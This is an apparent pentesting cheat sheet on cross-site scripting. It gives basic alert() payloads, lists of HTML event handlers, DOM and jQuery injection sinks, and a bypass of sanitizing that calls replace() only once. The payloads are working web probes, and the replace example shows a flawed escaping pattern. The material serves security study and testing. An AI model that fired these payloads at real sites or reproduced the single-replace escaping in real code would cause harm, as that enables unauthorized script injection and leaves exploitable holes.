---
title: XSS - Cross Site Scripting
description: XSS cheatsheets, payloads and tricks.
---

# XSS

## Attack

### Basic payload

```html
<sCRipT>alert()</scRipt>
<a href="javascript:alert()"></a>
<img src=x onerror="alert()">
```

More payloads on [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

### Vectors

If you can control the `href` tag of an anchor (`<a>` element). You can try to set the `href` value to `javascript:alert()`.

### HTML Events

Forms Events :

```
onblur
onchange
oncontextmenu
onfocus
oninput
oninvalid
onreset
onsearch
onselect
onsubmit
```

Keyboard events :

```
onkeydown
onkeypress
onkeyup
```

Mouse events :

```
onclick
ondblclick
onmousedown
onmousemove
onmouseout
onmouseover
onmouseup
onmousewheel
onwheel
```

Drag events :

```
ondrag
ondragend
ondragenter
ondragleave
ondragover
ondragstart
ondrop
onscroll
```

Clipboard events :

```
oncopy
oncut
onpaste
```

Media events :

```
onabort
oncanplay
oncanplaythrough
oncuechange
ondurationchange
onemptied
onended
onerror
onloadeddata
onloadedmetadata
onloadstart
onpause
onplay
onplaying
onprogress
onratechange
onseeked
onseeking
onstalled
onsuspend
ontimeupdate
onvolumechange
onwaiting
```

Misc events :

```
ontoggle
```

> Source [www.w3schools.com](https://www.w3schools.com/tags/ref_eventattributes.asp).

### DOM XSS

The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:

```
document.write()  
document.writeln()  
document.domain  
element.innerHTML  
element.outerHTML  
element.insertAdjacentHTML  
element.onevent  
```

The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:

```
add()  
after()  
append()  
animate()  
insertAfter()  
insertBefore()  
before()  
html()  
prepend()  
replaceAll()  
replaceWith()  
wrap()  
wrapInner()  
wrapAll()  
has()  
constructor()  
init()  
index()  
jQuery.parseHTML()  
$.parseHTML()
```

> Source [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/dom-based).

## Bypass

### Replace function

The `replace` function only replace the first occurence.

```js
> "<img src=x onerror='alert()'>".replace("<", "&lt;")
"&lt;img src=x onerror='alert()'>"


> "<<img src=x onerror='alert()'>".replace("<", "&lt;")
"&lt;<img src=x onerror='alert()'>"
```

